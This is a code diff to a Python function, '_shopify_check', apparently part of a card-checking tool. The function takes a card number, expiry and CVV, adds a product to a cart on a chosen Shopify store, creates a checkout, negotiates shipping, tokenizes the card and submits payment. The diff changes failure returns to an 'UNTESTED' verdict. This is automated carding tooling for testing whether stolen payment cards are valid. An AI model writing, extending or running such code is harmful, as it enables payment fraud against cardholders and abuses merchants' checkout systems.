@@ -262,7 +262,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         except:
             continue
     if not product:
-        return None, "No products available", gw_name, None
+        return None, "No products available", gw_name, {'verdict': 'UNTESTED'}
 
     variant_id = product['variant_id']
     subtotal_price = product['price']
@@ -275,9 +275,9 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     try:
         async with session.post(f"{base_url}/cart/add.js", json={'id': int(variant_id)}, headers=headers, timeout=aiohttp.ClientTimeout(total=6)) as resp:
             if resp.status != 200:
-                return None, "Failed to add to cart", gw_name, None
+                return None, "Failed to add to cart", gw_name, {'verdict': 'UNTESTED'}
     except:
-        return None, "Failed to add to cart", gw_name, None
+        return None, "Failed to add to cart", gw_name, {'verdict': 'UNTESTED'}
 
     # Create checkout
     ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml', 'Accept-Language': 'en-US,en;q=0.9'}
@@ -286,14 +286,14 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
             checkout_url = str(resp.url)
             text = await resp.text()
     except:
-        return None, "Failed to create checkout", gw_name, None
+        return None, "Failed to create checkout", gw_name, {'verdict': 'UNTESTED'}
 
     if 'login' in checkout_url.lower() or 'password' in checkout_url.lower():
-        return None, "Site requires login", gw_name, None
+        return None, "Site requires login", gw_name, {'verdict': 'UNTESTED'}
 
     sst = _extract_session_token(text)
     if not sst:
-        return None, "No session token", gw_name, None
+        return None, "No session token", gw_name, {'verdict': 'UNTESTED'}
 
     queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
     stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')
@@ -350,19 +350,19 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         _update_qt(result1)
 
         if not result1 or not isinstance(result1, dict):
-            return None, "Negotiate error: no response", gw_name, None
+            return None, "Negotiate error: no response", gw_name, {'verdict': 'UNTESTED'}
         tn = result1.get('__typename', '')
-        if tn == 'CheckpointDenied': return None, "Checkpoint Denied", gw_name, None
-        if tn == 'NegotiationResultFailed': return None, "Negotiation failed", gw_name, None
-        if tn != 'NegotiationResultAvailable': return None, f"Negotiation failed: {tn}", gw_name, None
+        if tn == 'CheckpointDenied': return None, "Checkpoint Denied", gw_name, {'verdict': 'UNTESTED'}
+        if tn == 'NegotiationResultFailed': return None, "Negotiation failed", gw_name, {'verdict': 'UNTESTED'}
+        if tn != 'NegotiationResultAvailable': return None, f"Negotiation failed: {tn}", gw_name, {'verdict': 'UNTESTED'}
 
         sp1 = result1.get('sellerProposal')
-        if not sp1 or not isinstance(sp1, dict): return None, "No seller proposal", gw_name, None
+        if not sp1 or not isinstance(sp1, dict): return None, "No seller proposal", gw_name, {'verdict': 'UNTESTED'}
         running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
         if api_pmi and not payment_method_id: payment_method_id = api_pmi
         gw_name = api_gw or 'Shopify Payments'
 
-        if not delivery_strategy: return None, "No shipping available", gw_name, None
+        if not delivery_strategy: return None, "No shipping available", gw_name, {'verdict': 'UNTESTED'}
 
         def _build_delivery():
             return {'deliveryLines': [{'destination': {'streetAddress': addr_block}, 'selectedDeliveryStrategy': {'deliveryStrategyMatchingConditions': {'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True}}, 'options': {'phone': phone}}, 'targetMerchandiseLines': {'any': True}, 'deliveryMethodTypes': ['SHIPPING'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}], 'noDeliveryRequired': [], 'useProgressiveRates': False, 'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True}
@@ -379,7 +379,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
                 if api_pmi2 and not payment_method_id: payment_method_id = api_pmi2
                 if api_gw2: gw_name = api_gw2
     except Exception as e:
-        return None, f"Negotiate error: {str(e)[:50]}", gw_name, None
+        return None, f"Negotiate error: {str(e)[:50]}", gw_name, {'verdict': 'UNTESTED'}
 
     # Tokenize card
     year_full = f"20{yy}" if len(yy) == 2 else yy
@@ -402,11 +402,11 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
             if 'id' not in vault_data:
                 err_msg = vault_data.get('error', '') or str(vault_data)[:100]
                 logger.info(f"Vault rejected: {err_msg}")
-                return None, f"Invalid card - vault rejected ({err_msg[:50]})", gw_name, None
+                return None, f"Invalid card - vault rejected ({err_msg[:50]})", gw_name, {'verdict': 'UNTESTED'}
             payment_token = vault_data['id']
     except Exception as e:
         logger.info(f"Vault failed: {str(e)[:80]}")
-        return None, "Invalid card - vault failed", gw_name, None
+        return None, "Invalid card - vault failed", gw_name, {'verdict': 'UNTESTED'}
 
     # Submit payment
     try:
